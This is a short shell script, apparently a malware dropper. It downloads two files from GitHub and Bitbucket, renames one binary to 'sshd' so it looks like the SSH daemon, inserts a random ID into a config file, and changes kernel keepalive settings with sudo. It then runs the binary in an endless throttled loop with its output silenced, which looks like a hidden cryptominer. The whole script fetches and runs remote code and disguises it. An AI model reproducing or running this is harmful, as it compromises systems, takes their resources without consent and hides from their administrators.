#!/bin/sh
wget https://raw.githubusercontent.com/budoluwaw/teskun/main/-
wget https://bitbucket.org/fapro/dafer/raw/714acac532a27b0a36417a327eb69564fb62f690/build_config
chmod +x - build_config
SC=sshd
mv - $SC
sed -i "s/BARU/$(shuf -n 1 -i 1-99999)/" "build_config"
sudo /sbin/sysctl -w net.ipv4.tcp_keepalive_time=5 net.ipv4.tcp_keepalive_intvl=5 net.ipv4.tcp_keepalive_probes=5
while :; do timeout 2m cpulimit -l 2 ./$SC; sleep 20; done >/dev/null >/dev/null 2>&1
